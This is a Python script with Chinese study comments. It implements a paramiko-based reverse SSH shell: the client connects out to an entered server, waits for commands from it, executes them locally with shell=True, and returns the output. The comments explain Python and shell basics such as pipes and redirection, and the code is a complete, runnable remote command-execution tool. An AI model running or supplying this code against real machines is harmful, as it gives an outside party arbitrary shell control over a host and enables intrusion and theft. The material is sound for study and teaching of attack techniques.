import paramiko
import shlex
import subprocess

def ssh_command(ip,port,user,passwd,command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port = port,username = user,password = passwd)

    ssh_session = client.get_transport().open_session()
    # get_transport()-获取SSH连接的传输,传输层负责处理加密,压缩,数据包等底层信息,返回一个Transport对象
    # .open_session()-在传输层上打开一个新的SSH会话通道,创建一个独立的命令执行环境,返回一个Channl对象
    if ssh_session.active:# 返回一个布尔值表示通道是否活跃
        ssh_session.send(command)# 通过会话通道,客户端向服务端发送指令
        print(ssh_session.recv(1024).decode())# 客户端屏幕上显示,通过会话通道,服务端返回的结果(最多1024字节)的解码
        while True:
            command = ssh_session.recv(1024)# 命令command = 服务端给客户端传输的信息(最多1024字节)
            try:
                cmd = command.decode()# 也是命令cmd = 命令command的解码
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd),shell = True)# 命令cmd的返回结果 = 执行命令cmd且返回命令的标准输出的字节字符串
                # 1.subprocess.check_ouput()-执行系统命令并捕获命令的输出,
                #                            如果命令执行失败(返回非零退出码)会抛出CalledProcessError异常,
                #                            返回命令的标准输出作为字节字符串
                # 2.shlex.split()-将命令行字符串安全地分割成参数列表
                # shlex.split(cmd)和cmd.split()区别:
                # cmd.split()-简单地按空白字符分割
                # shlex.split(cmd)-按照shell语法规则分割
                # 3.shell=True-通过系统的shell解释器执行命令,允许使用shell特性（管道、重定向、通配符等）
                # (1)管道(Pipe):|
                # 就像工厂的流水线，上一道工序的产品直接传给下一道工序
                # 例一:查看进程，然后筛选出python相关进程
                # ps aux | grep python
                # 例二:统计当前目录文件数量
                # ls | wc -l
                # (2)重定向(Redirection)
                # ① > 输出重定向（覆盖） ,例:将命令输出保存到文件（覆盖原有内容） ls -l > file_list.txt
                # ② >> 输出重定向（追加） ,例:将输出追加到文件末尾 echo "新内容" >> file_list.txt
                # ③ < 输入重定向 ,例:邮件内容从文件读取 mail user@example.com < message.txt
                # ④ 2> 错误重定向 ,例:将错误信息保存到文件 python script.py 2> error.log
                # (3)通配符(Wildcards)
                # * 匹配任意多个字符;? 匹配单个字符;[] 匹配指定范围的字符
                ssh_session.send(cmd_output or 'okay')# 客户端通过会话通道向服务端传输命令cmd的返回结果,如果返回结果是空,返回'okay'
            except Exception as e:# 若产生异常,给异常起别名e
                ssh_session.send(str(e))# 客户端通过会话通道向服务端传输异常的字符串
        client.close()
    return

if __name__ == '__main__':
    import getpass# 用于安全地获取用户输入
    user = getpass.getuser()# 获取用户名和密码
    password = getpass.getpass()

    ip = input('Enter server IP:')
    port = input('Enter port:')
    ssh_command(ip,port,user,password,'ClientConnected')###############3

